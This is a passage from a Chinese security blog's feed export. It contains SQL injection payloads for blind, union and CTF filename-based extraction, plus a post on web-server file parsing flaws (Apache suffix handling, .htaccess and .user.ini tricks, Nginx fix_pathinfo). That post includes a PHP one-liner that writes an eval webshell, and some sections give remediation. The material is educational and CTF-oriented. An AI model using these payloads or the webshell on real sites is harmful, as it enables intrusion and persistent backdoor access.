class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>((<span class="keyword">select</span><span class="operator">+</span>concat(column_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.columns</span><br><span class="line"><span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span>table_schema<span class="operator">%</span><span class="number">3</span>ddatabase()<span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>table_name<span class="operator">%</span><span class="number">3</span>d0x676f6f6473<span class="operator">+</span>limit<span class="operator">+</span><span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x69</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正常</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>((<span class="keyword">select</span><span class="operator">+</span>concat(column_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.columns</span><br><span class="line"><span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span>table_schema<span class="operator">%</span><span class="number">3</span>ddatabase()<span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>table_name<span class="operator">%</span><span class="number">3</span>d0x676f6f6473<span class="operator">+</span>limit<span class="operator">+</span><span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x68</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br></pre></td></tr></table></figure><h3 id="3、有关函数"><a href="#3、有关函数" class="headerlink" title="3、有关函数"></a>3、有关函数</h3><h3 id="3-1-不常用函数绕过滤"><a href="#3-1-不常用函数绕过滤" class="headerlink" title="3.1 不常用函数绕过滤"></a>3.1 不常用函数绕过滤</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lpad(data,<span class="number">1</span>,space(<span class="number">1</span>)) <span class="operator">/</span><span class="operator">/</span> lpad(<span class="string">&#x27;hi&#x27;</span>,<span class="number">4</span>,<span class="string">&#x27;?&#x27;</span>) <span class="operator">=</span> <span class="string">&#x27;??hi&#x27;</span></span><br><span class="line">rpad(data,<span class="number">1</span>,space(<span class="number">1</span>)) <span class="operator">/</span><span class="operator">/</span> rpad(<span class="string">&#x27;hi&#x27;</span>,<span class="number">4</span>,<span class="string">&#x27;?&#x27;</span>) <span class="operator">=</span> <span class="string">&#x27;hi??&#x27;</span></span><br><span class="line"><span class="keyword">left</span>(data,<span class="number">1</span>)</span><br><span class="line">reverse(<span class="keyword">right</span>(reverse(data),<span class="number">1</span>))</span><br><span class="line"><span class="keyword">insert</span>(<span class="keyword">insert</span>(version(),<span class="number">1</span>,<span class="number">0</span>,space(<span class="number">0</span>)),<span class="number">2</span>,<span class="number">222</span>,space(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><h3 id="3-2-搜索匹配类的函数"><a href="#3-2-搜索匹配类的函数" class="headerlink" title="3.2 搜索匹配类的函数"></a>3.2 搜索匹配类的函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;-if(locate(&#x27;</span>f<span class="string">&#x27;,data),1,0)#</span></span><br><span class="line"><span class="string">&#x27;</span><span class="operator">-</span>if(locate(<span class="string">&#x27;fo&#x27;</span>,data),<span class="number">1</span>,<span class="number">0</span>)#</span><br><span class="line"><span class="string">&#x27;-if(locate(&#x27;</span>foo<span class="string">&#x27;,data),1,0)#</span></span><br><span class="line"><span class="string">instr(), position()</span></span><br></pre></td></tr></table></figure><h3 id="3-3、一些数学函数"><a href="#3-3、一些数学函数" class="headerlink" title="3.3、一些数学函数"></a>3.3、一些数学函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、format(x,y)  函数，功能是将一个数字x，保留y位小数，并且整数部分用逗号分隔千分位，小数部分四舍五入。</span><br><span class="line"><span class="number">2</span>、<span class="built_in">abs</span>();  求一个数的绝对值；absolute</span><br><span class="line"><span class="number">3</span>、<span class="built_in">sqrt</span>();求一个数的平方根。sqrt是sqruar(平方，矩形) ，root（根）的缩写。</span><br><span class="line"><span class="number">4</span>、<span class="built_in">mod</span>(x,y)  x除数，y被除数。结束是余数。</span><br><span class="line"><span class="number">5</span>、<span class="built_in">ceil</span>()  进一取整。<span class="built_in">floor</span>()舍一取整</span><br><span class="line">这两个函数是镜子函数，比较有点意思。这两个函数并不进行四舍五入，比较强硬。</span><br><span class="line"><span class="number">6</span>、rand()  顾名思义，是用来生成随机数用的。种子不变数值不变。</span><br><span class="line"><span class="number">7</span>、format 会自动进行千分位，下面我们来看看round函数，进行四舍五入。</span><br><span class="line"><span class="number">8</span>、<span class="keyword">truncate</span>(x,y)  比较霸道，不管四舍五入，直接把x，的y位小数直接干掉。</span><br><span class="line"><span class="number">9</span>、sign() 返回当前结果得符号，如果是负数返回<span class="number">-1</span>，如果是<span class="number">0</span> 返回<span class="number">0</span> 如果是正数，返回<span class="number">1.</span></span><br><span class="line"><span class="number">10</span>、<span class="built_in">power</span>()  幂运算</span><br><span class="line"><span class="number">11.</span><span class="built_in">SIN</span>(X)、<span class="built_in">ASIN</span>(X)、<span class="built_in">COS</span>(X)、<span class="built_in">ACOS</span>(X)、<span class="built_in">TAN</span>(X)、<span class="built_in">ATAN</span>(X)、COT(X)  三角函数</span><br><span class="line"><span class="number">12.</span>RADIANS(X) 和 DEGREES(X): 角度与弧度转换函数</span><br><span class="line"><span class="number">13.</span> <span class="built_in">LOG</span>(X)和<span class="built_in">LOG10</span>(X): 对数运算函数</span><br><span class="line"><span class="number">14.</span> POW(X,Y), <span class="built_in">POWER</span>(X,Y)和<span class="built_in">EXP</span>(X)</span><br></pre></td></tr></table></figure><h3 id="3-4、使用函数进行字符串的切割"><a href="#3-4、使用函数进行字符串的切割" class="headerlink" title="3.4、使用函数进行字符串的切割"></a>3.4、使用函数进行字符串的切割</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">length(<span class="built_in">trim</span>(<span class="keyword">leading</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">FROM</span> data)) # length will be shorter</span><br><span class="line">length(replace(data, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) # length will be shorter</span><br></pre></td></tr></table></figure><h3 id="3-5、字符串连接"><a href="#3-5、字符串连接" class="headerlink" title="3.5、字符串连接"></a>3.5、字符串连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;|&#x27;,&#x27;11&#x27;,&#x27;22&#x27;,&#x27;33&#x27;);//11|22|33</span><br><span class="line">select concat(&#x27;11&#x27;,&#x27;22&#x27;,&#x27;33&#x27;);//112233</span><br><span class="line">select &quot;a&quot;&#x27;d&#x27;&quot;m&quot;&#x27;i&#x27;&quot;n&quot;;</span><br></pre></td></tr></table></figure><h3 id="4-关于php中md5的一个有意思的小技巧"><a href="#4-关于php中md5的一个有意思的小技巧" class="headerlink" title="4 关于php中md5的一个有意思的小技巧"></a>4 关于php中md5的一个有意思的小技巧</h3><p>PHP中这么一段sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM admin WHERE pass = &#x27;&quot;.md5($password,<span class="literal">true</span>).&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>这里是可以注入绕过的，在php关于<a href="http://php.net/manual/en/function.md5.php">MD5函数</a>的介绍说</p><p>如果可选的 <code>raw_output</code> 被设置为 <strong>TRUE</strong>，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p><p>也就是找到一个字符串MD5的二进制恰好和字符编码中的某些编码对上了，就可以产生注入，原文作者找到这么一串字符串<code>ffifdyop</code>,md5加密后对应字符编码刚好是<code>&#39;or&#39;&lt;trash&gt;</code>,便产生注入</p><blockquote><p><a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes">原文在这</a></p></blockquote><h3 id="5、常用"><a href="#5、常用" class="headerlink" title="5、常用"></a>5、常用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,1,database() #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() #</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,1,group_concat(column_name) from information_schema.column where tabele_name=&#x27;</span> xxx<span class="string">&#x27; #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,xx <span class="keyword">from</span> xxxx.xxx # </span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line"><span class="number">1</span><span class="string">&#x27;union select 1,1,group_concat(xx) from xxx #</span></span><br></pre></td></tr></table></figure><h3 id="6、SQL与文件上传"><a href="#6、SQL与文件上传" class="headerlink" title="6、SQL与文件上传"></a>6、SQL与文件上传</h3><p>典型的2015RCTF题型 打着文件上传的幌子，实际上是SQL注入，注入方式也很特别，所以当我们拿到文件上传想关题目，什么姿势都试过了，却拿不到flag，这个时候可以换个方式，找找注入点，一般注入点在filename,payload如下:</p><h4 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>)</span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>)</span><br></pre></td></tr></table></figure><h4 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),25,12),16,10))+&#x27;</span>.jpg</span><br></pre></td></tr></table></figure><h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br></pre></td></tr></table></figure><h4 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#x27;</span>.jpg</span><br></pre></td></tr></table></figure><p>类似于这样的题目都是骚题目，所以flag肯定不会一下就出来，每次只会 出来一部分，所以需要我们迂回注入<br>即为修改一下substr的起始位置参数，看看后边还有没有<br>当然根据情况而定，如果一次性爆出来就不需要迂回了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File Parsing Vulnerabilities</title>
      <link href="/2020/07/02/File-Parsing-Vulnerabilities/"/>
      <url>/2020/07/02/File-Parsing-Vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>文件解析漏洞,是指Web容器（Apache、nginx、iis等）在解析文件时出现了漏洞,以其他格式执行出脚本格式的效果。从而,黑客可以利用该漏洞实现非法文件的解析。</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-0cbcec2ee7ee2355.png" alt="图片.png"></p><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><h3 id="多后缀"><a href="#多后缀" class="headerlink" title="多后缀"></a>多后缀</h3><p><strong>原理</strong></p><p>在Apache1.x，2.x中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。</p><p><strong>因此我可以上传一个test.php.qwer文件绕过验证且服务器依然会将其解析为php。<br>Apache能够认识的文件在mime.types文件里</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-9910b0448ece548a.png" alt="图片.png"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p><strong>后缀验证尽量使用白名单的方式，这样即使使用不存在的后缀名，也无法绕过。</strong></p><h3 id="配置问题导致漏洞"><a href="#配置问题导致漏洞" class="headerlink" title="配置问题导致漏洞"></a>配置问题导致漏洞</h3><ul><li>如果在 Apache 的 conf 里有这样一行配置 <code>AddHandler php5-script .php</code> 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。</li><li>如果在 Apache 的 conf 里有这样一行配置 <code>AddType application/x-httpd-php .jpg</code>即使扩展名是 jpg，一样能以 php 方式执行。</li></ul><h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p><strong>1. apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ “.(php.|php3.)”&gt;</span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure><p>2.<strong>用伪静态能解决这个问题，重写类似<code>.php.\*</code>这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules&#x2F;mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteRule .(php.|php3.) /index.php</span><br><span class="line">RewriteRule .(pHp.|pHp3.) /index.php</span><br><span class="line">RewriteRule .(phP.|phP3.) /index.php</span><br><span class="line">RewriteRule .(Php.|Php3.) /index.php</span><br><span class="line">RewriteRule .(PHp.|PHp3.) /index.php</span><br><span class="line">RewriteRule .(PhP.|PhP3.) /index.php</span><br><span class="line">RewriteRule .(pHP.|pHP3.) /index.php</span><br><span class="line">RewriteRule .(PHP.|PHP3.) /index.php</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><h3 id="畸形后缀"><a href="#畸形后缀" class="headerlink" title="畸形后缀"></a>畸形后缀</h3><p>Apache配置文件中会有<code>.+.ph(p[345]?|t|tml)</code>此类的正则表达式，被当php程序执行的文件名要符合正则表达式，否则就算Apache把某文件当php程序，php自己不认它，也是无用。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200702164453356.png" alt="image-20200702164453356"></p><p>也就是说<code>php3，php4，php5，pht，phtml</code>也是可以被解析的。</p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p><strong>一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）</strong><br>要想使.htaccess文件生效，需要两个条件:<br><strong>一是在Apache的配置文件中写上：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure><p><strong>二是Apache要加载mod_Rewrite模块。加载该模块，需要在Apache的配置文件中写上：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><p>若是在Ubuntu中，可能还需要执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo a2enmod rewrite</span><br></pre></td></tr></table></figure><p>配置完后需要重启Apache。</p><p><strong>.htaccess文件可以配置很多事情，如是否开启站点的图片缓存、自定义错误页面、自定义默认文档、设置WWW域名重定向、设置网页重定向、设置图片防盗链和访问权限控制。但我们这里只关心.htaccess文件的一个作用——MIME类型修改。如在.htaccess文件中写入：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php xxx</span><br></pre></td></tr></table></figure><p><strong>就成功地使该.htaccess文件所在目录及其子目录中的后缀为.xxx的文件被Apache当做php文件。</strong><br><strong>另一种写法是：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>该语句会让Apache把shell.jpg文件解析为php文件。</p><p>故 我们可以先上传 .htaccess ，然后再上传含有shell的文件</p><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><h3 id="对比-htaccess"><a href="#对比-htaccess" class="headerlink" title="对比.htaccess"></a>对比.htaccess</h3><p><code>.user.ini</code>，它比<code>.htaccess</code>用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm&#x2F;fastcgi，我的IIS php5.3以上的全部用的fastcgi&#x2F;cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。</p><h3 id="什么是-user-ini"><a href="#什么是-user-ini" class="headerlink" title="什么是.user.ini"></a>什么是.user.ini</h3><p>php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/5ad87a713b6248f47c25c28c881e204bb3f92b16.jpg" alt="img"></p><p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p><p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/da88a3b19d2342cda25cf96e28993fd57dee4559.jpg" alt="img"></p><p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/e9620fbd3fbc9aa5fc043cb4079b3361595cc926.jpg" alt="img"></p><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=01.gif</span><br></pre></td></tr></table></figure><p>01.gif是要包含的文件。</p><p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p><p>测试一下，我分别在IIS6.0+Fastcgi+PHP5.3和nginx+fpm+php5.3上测试。 目录下有.user.ini，和包含webshell的01.gif，和正常php文件echo.php：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/3a69a5d69cb337bb5ee67d9cc452d239b8cec0dc.jpg" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1c054af65f57ca9063a7446ccc7de65da38c7e8a.jpg" alt="img"></p><p>访问echo.php即可看到后门：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/7df48ae02617076a3d1912def51b76d2ad374ebd.jpg" alt="img"></p><p>Nginx下同样：</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/097abc067a74ab351d5769a9e47e6c3c0b40e190.jpg" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/8a9fbe51fc4c149b3f15096d28e35394e4eb9ce3.jpg" alt="img"></p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p> 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p><h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><h3 id="PHP-CGI解析漏洞"><a href="#PHP-CGI解析漏洞" class="headerlink" title="PHP CGI解析漏洞"></a>PHP CGI解析漏洞</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-ef9717d27ce7f505.png" alt="图片.png"><br><strong>当访问xx.com&#x2F;phpinfo.jpg&#x2F;1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI。</strong></p><p><strong>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问xx.com&#x2F;phpinfo.jpg&#x2F;1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</strong></p><p>简言之，如果fix_pathinfo开启，并且Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME，那么上传phpinfo.jpg&#x2F;1.php，phpinfo.jpg就会被当作PHP文件解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com/UploadFiles/image/1.jpg/1.php  </span><br><span class="line">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</span><br></pre></td></tr></table></figure><p><strong>另外一种手法：上传一个名字为test.jpg，以下内容的文件。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>然后访问test.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。</strong></p><p><strong>这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。</strong><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-85fb966ca25aad8a.png" alt="图片.png"><br><strong>这个往前递归的功能原本是想解决&#x2F;info.php&#x2F;test这种URL，能够正确解析到info.php。</strong></p><p><strong>在Nginx配置fastcgi使用php时，会存在文件类型解析问题。其实可以说它与Nginx本身关系不大，Nginx只是作为一个代理把请求转发给fastcgi Server，PHP在后端处理这一切。因此在其他fastcgi环境下，PHP也存在此问题，只是使用Nginx作为Web Server时，一般使用fastcgi的方式调用脚本解释器，这种使用方式最为常见。</strong></p><h3 id="防御方法"><a href="#防御方法" class="headerlink" 